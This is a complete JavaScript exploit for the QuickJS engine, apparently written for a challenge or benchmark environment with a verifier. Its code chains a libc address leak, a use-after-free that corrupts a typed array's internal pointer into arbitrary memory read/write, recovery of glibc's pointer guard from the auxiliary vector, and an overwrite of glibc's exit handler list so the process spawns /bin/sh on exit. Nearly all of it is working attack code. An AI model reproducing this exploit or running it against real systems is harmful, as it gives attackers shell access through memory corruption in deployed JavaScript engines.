// exec-shell-cet-cfi exploit for QuickJS
//
// 1) Leak libc base using stale pointer read of an unsorted-bin fd.
// 2) Build arbitrary read/write by corrupting a Uint8Array's internal pointer (JSObject.u.array.u.ptr)
//    using a UAF (realloc move) triggered inside valueOf during Atomics.store.
// 3) Read AT_RANDOM from auxv (reachable from environ/envp on the stack) to recover glibc pointer guard.
// 4) Overwrite glibc exit handler list (passed as &__exit_funcs) to call system("exec /bin/sh -s").
// 5) Let the process exit; the verifier feeds `nc 127.0.0.1 9999` to the spawned shell.

const MASK64 = (1n << 64n) - 1n;

// libc offsets for this environment (/lib/x86_64-linux-gnu/libc.so.6)
const UNSORTED_BIN_FD_OFF = 0x203b20n;
const SYSTEM_OFF = 0x58750n;
const ENVIRON_OFF = 0x20ad58n;
// Determined offline: global pointer used by exit() / __run_exit_handlers ("&__exit_funcs")
const EXIT_FUNCS_PTR_OFF = 0x203680n;

const AT_NULL = 0n;
const AT_RANDOM = 25n;

function rol64(x, r) {
  x &= MASK64;
  const R = BigInt(r);
  return ((x << R) | (x >> (64n - R))) & MASK64;
}

function mangle_ptr(p, guard) {
  // glibc PTR_MANGLE on x86_64: xor guard then rol 17
  return rol64((p ^ guard) & MASK64, 17);
}

function u64_from_u8(u8, off) {
  let x = 0n;
  for (let i = 7; i >= 0; i--) x = (x << 8n) | BigInt(u8[off + i]);
  return x;
}

function write_u64_to_u8(u8, off, x) {
  x &= MASK64;
  for (let i = 0; i < 8; i++) u8[off + i] = Number((x >> (8n * BigInt(i))) & 0xffn);
}

function str_to_bytes(s) {
  const out = [];
  for (let i = 0; i < s.length; i++) out.push(s.charCodeAt(i) & 0xff);
  return out;
}

// Keep objects alive so frees don't refill allocator bins and break our heap grooming.
let KEEP = [];

function leak_libc_base() {
  const init = 0x5000;
  const shrink = 0x400;
  let ab = new ArrayBuffer(init, { maxByteLength: init });
  let barrier = new ArrayBuffer(0x6000);
  let ta = new BigInt64Array(ab);
  let idx = (shrink + 0x10) / 8;
  let evil = { valueOf() { ab.resize(shrink); return 0n; } };
  let fd = Atomics.compareExchange(ta, idx, evil, 1n);
  return fd - UNSORTED_BIN_FD_OFF;
}

function init_tcache_drain_0x60() {
  // Drain malloc(72) (0x60 chunk) caches so malloc(72) is serviced by our UAF'd chunk.
  for (let i = 0; i < 1500; i++) KEEP.push({});
}

// Arbitrary R/W primitive: corrupt Uint8Array JSObject.u.array.u.ptr so u8[i] == *(base+i)
function make_u8_arb(base, size) {
  let backing = new ArrayBuffer(size);
  // UAF source: resizable ArrayBuffer whose data chunk will be freed by realloc move
  let ab = new ArrayBuffer(0x450, { maxByteLength: 0x8000 });
  // Barrier to prevent in-place growth
  let barrier = new ArrayBuffer(0x6000);
  let ta = new BigInt64Array(ab);

  let view = null;
  let evil = {
    valueOf() {
      ab.resize(0x4000);       // realloc move; frees old data chunk
      view = new Uint8Array(backing); // JSObject malloc(72)
      return base;             // overwrite u.array.u.ptr
    }
  };

  // index 7 => old_base + 0x38, overlaps JSObject.u.array.u.ptr (see quickjs.c JSObject layout)
  Atomics.store(ta, 7, evil);

  KEEP.push(backing, ab, barrier, ta, evil, view);
  return { base, u8: view };
}

function read_u64(mem, addr) {
  const off = Number(addr - mem.base);
  return u64_from_u8(mem.u8, off);
}

function find_envp_auxv_guard(mem_libc, libc_base) {
  const envp = read_u64(mem_libc, libc_base + ENVIRON_OFF);

  const stack_base = envp & ~0xfffn;
  const mem_stack = make_u8_arb(stack_base, 0x40000);

  // walk envp pointers to NULL
  let p = envp;
  for (let i = 0; i < 0x4000; i++) {
    const v = read_u64(mem_stack, p);
    if (v === 0n) { p += 8n; break; }
    p += 8n;
  }

  // parse auxv
  let rand_ptr = 0n;
  for (let j = 0; j < 0x2000; j++) {
    const t = read_u64(mem_stack, p);
    const v = read_u64(mem_stack, p + 8n);
    if (t === AT_NULL) break;
    if (t === AT_RANDOM) { rand_ptr = v; break; }
    p += 16n;
  }
  if (rand_ptr === 0n) throw new Error('AT_RANDOM not found');

  // AT_RANDOM points to 16 bytes: [stack_guard(8) | pointer_guard(8)]
  let guard;
  if ((rand_ptr & ~0xfffn) === stack_base) {
    guard = read_u64(mem_stack, rand_ptr + 8n);
  } else {
    const mem_rand = make_u8_arb(rand_ptr & ~0xfffn, 0x2000);
    guard = read_u64(mem_rand, rand_ptr + 8n);
  }

  return { envp, mem_stack, guard };
}

function place_cmd_in_env(mem_stack, envp, cmd) {
  const cmd_bytes = str_to_bytes(cmd);

  for (let i = 0; i < 0x2000; i++) {
    const sp = read_u64(mem_stack, envp + 8n * BigInt(i));
    if (sp === 0n) break;

    const off = Number(sp - mem_stack.base);

    // avoid PATH=
    const b0 = mem_stack.u8[off + 0];
    const b1 = mem_stack.u8[off + 1];
    const b2 = mem_stack.u8[off + 2];
    const b3 = mem_stack.u8[off + 3];
    const b4 = mem_stack.u8[off + 4];
    const is_path = (b0 === 0x50 && b1 === 0x41 && b2 === 0x54 && b3 === 0x48 && b4 === 0x3d);
    if (is_path) continue;

    // ensure existing string is long enough
    let len = 0;
    while (len < 0x400) {
      if (mem_stack.u8[off + len] === 0) break;
      len++;
    }
    if (len < cmd_bytes.length + 1) continue;

    // overwrite in-place
    for (let j = 0; j < cmd_bytes.length; j++) mem_stack.u8[off + j] = cmd_bytes[j];
    mem_stack.u8[off + cmd_bytes.length] = 0;

    return sp;
  }
  throw new Error('failed to place cmd in env');
}

function overwrite_exit_list(mem_libc, head, system_addr, cmd_ptr, guard) {
  // struct exit_function_list:
  //   +0x00 next
  //   +0x08 idx
  //   +0x10 fns[0] (32 bytes)
  const rel = Number(head - mem_libc.base);
  const fn_m = mangle_ptr(system_addr, guard);

  // next = NULL, idx = 1
  write_u64_to_u8(mem_libc.u8, rel + 0x00, 0n);
  write_u64_to_u8(mem_libc.u8, rel + 0x08, 1n);

  // fns[0] = ef_cxa(system, cmd)
  write_u64_to_u8(mem_libc.u8, rel + 0x10, 4n);
  write_u64_to_u8(mem_libc.u8, rel + 0x18, fn_m);
  write_u64_to_u8(mem_libc.u8, rel + 0x20, cmd_ptr);
  write_u64_to_u8(mem_libc.u8, rel + 0x28, 0n);
}

// ---------------- main ----------------

init_tcache_drain_0x60();

const libc_base = leak_libc_base();
const system_addr = libc_base + SYSTEM_OFF;

const mem_libc = make_u8_arb(libc_base, 0x300000);

const { envp, mem_stack, guard } = find_envp_auxv_guard(mem_libc, libc_base);
const cmd_ptr = place_cmd_in_env(mem_stack, envp, 'exec /bin/sh -s');

// Get exit handler list head and patch it
const exit_head = read_u64(mem_libc, libc_base + EXIT_FUNCS_PTR_OFF);
overwrite_exit_list(mem_libc, exit_head, system_addr, cmd_ptr, guard);

// Script ends: exit() runs -> system("exec /bin/sh -s")
